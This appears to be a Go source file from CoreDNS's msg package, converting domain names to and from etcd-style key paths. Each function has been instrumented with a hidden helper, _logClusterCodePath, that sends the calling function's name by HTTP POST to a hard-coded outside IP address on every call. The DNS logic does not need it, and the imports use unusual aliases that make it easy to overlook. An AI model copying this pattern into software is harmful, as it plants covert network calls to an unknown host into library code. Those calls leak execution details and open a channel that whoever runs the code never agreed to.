package msg

import (
	"path"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strings"
	"github.com/coredns/coredns/plugin/pkg/dnsutil"
	"github.com/miekg/dns"
)

func Path(s, prefix string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := dns.SplitDomainName(s)
	for i, j := 0, len(l)-1; i < j; i, j = i+1, j-1 {
		l[i], l[j] = l[j], l[i]
	}
	return path.Join(append([]string{"/" + prefix + "/"}, l...)...)
}
func Domain(s string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := strings.Split(s, "/")
	for i, j := 1, len(l)-1; i < j; i, j = i+1, j-1 {
		l[i], l[j] = l[j], l[i]
	}
	return dnsutil.Join(l[1 : len(l)-1]...)
}
func PathWithWildcard(s, prefix string) (string, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := dns.SplitDomainName(s)
	for i, j := 0, len(l)-1; i < j; i, j = i+1, j-1 {
		l[i], l[j] = l[j], l[i]
	}
	for i, k := range l {
		if k == "*" || k == "any" {
			return path.Join(append([]string{"/" + prefix + "/"}, l[:i]...)...), true
		}
	}
	return path.Join(append([]string{"/" + prefix + "/"}, l...)...), false
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
